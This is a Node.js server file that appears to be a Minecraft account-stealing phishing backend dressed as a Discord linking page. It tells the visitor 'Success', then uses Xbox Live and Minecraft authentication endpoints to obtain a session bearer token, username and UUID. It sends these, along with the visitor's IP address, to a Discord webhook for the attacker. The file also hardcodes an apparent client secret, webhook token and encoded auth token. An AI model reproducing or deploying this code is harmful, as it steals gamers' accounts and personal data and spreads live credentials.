// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

console.log('got them both')
app.get('/', async (req, res) => {
    console.log('no query code for u')
    res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        const xstsTokenHashArray = await getXSTSToken('eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.MH7z6FleteKbgRIFFOY_eRPzowocCg7j9MqXjOG1xsa26D_2Ix5n_kcj9R9XBdboX-MCEwaXBuTVKlFBjAe6-TuJUAd9-E4blPJSUlMAVsufT18Zid5q1JHxQ6tTGF5M4lIz88aKbjEHlM-KJYCaYfqaQdOvyYOOA_f0Bzw3HmdpkjeBbIyV2Q4oktIirOV4uQl7z4E9dijnD7W7ThYWsUKS-pi8z2jbwU9orRcdYYe8dDP2zP9Z3xGGmgHVzWzuSmKgNfYUlMG9jUmxzvZ4hqxezIf-580ZYCYKKOwDMzxfDpIU1V2dAJHG8GcrQ7k0eu5YWBax7Kar_IAYw19a8w.UMq11oA9qx-qcYoIadOv7A.eX5piSFmM4CPfjuKTD0DBsT8ExU2Wx4nX9pTFAmWmoeEPlI79bjn1FdcuEqR1nO-SCSCM-_k8dzzrN89dMVSVcNPtA8lXR3mGwt-boBqRdB6nSsFAoGQY9pWayvQTfyHKbYwNpJFWAp4nbbYX5wnWuGfxYNUcxajWxxnEZrWp3Llp3HS3ZkaqR71b5kaf2pGmrLMHKdxhEVcSadZYwEj4yN58P-ZdNVrpae79aWj_fAjjmyIDnSFuGg-K_afppD1dJhvZizRDs611-MsFsOpN6upT8dijCCjVwli4kHrhnWtEAZXnq3tiE7cKtmMXPLPNBgTJQJ5PpsemA86emg9udPzTADJ1g4Z10wC6LcMXedMSYUQ8sAb_COgeEJE9lhhqEvIJJ-VsuzNDVnznUcbUWoj3TTsSA5Dmqd7JdUmzefRZkBqBMyOydcCjNBiGii9f_Zi2IbfIqMfW1UnT16URC6Q2hPnApS-LgQmUaOTy9hFqQn2rZJ0FebI6FZwj2yU8RsW7vC31UbteErTDGBJ_0HRSlyjKuuQGT8sQcePm_mszD01zbSaYEQov3dy8zQjWB0UodNUZpS1ps4P9Cem2l4aqeQTrvw70h84mnUngSZ85CXaLYRfkayT9VS3-oRJdi9VRVYi9H6z_qtNPCzGwoDpTXKoyVE55qo5tUKPj2B6UcYKRsUv67uIyoyGAIvR3ot6SxvUdR829cnpKU-YaLaUyQIUQyPu4j2h9ZGMCYl8coxYLkovlyGTcTUx3Tk3dMhX3vhFW7ScSYDGxMViR_1YhuzcfoD4ac_x17cIqkd496mN8HR4AOW4g82Ztjq_k-CRHzxPQGjrWE_tJ3znju9xW3vp6Gr9lZOtvUbM_T5Hu-GaJIhwR1QaOWoWvQNuBWw-rcgbtEPFmNyI_s-bTNntSK2KcDV9wmhHcPkNAgNcXu9NXDdPnV5aR_lstKOQZzGpeulfBzl9cDXt__KzIu9DZLiOcBc6zKvKyz9SKOSEnjyZszLuej_OEXS2_evc.r7G2-zyqdCq_tfpqFQnrVw')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        if (checkIfBanned(username)) {
            return
        }
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "@everyone" + "  `xbl token: " + userToken + "`",
        embeds: [{
            title: "User Info", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: ip, inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Refresh Token", value: refreshToken, inline: false},

                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}



const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
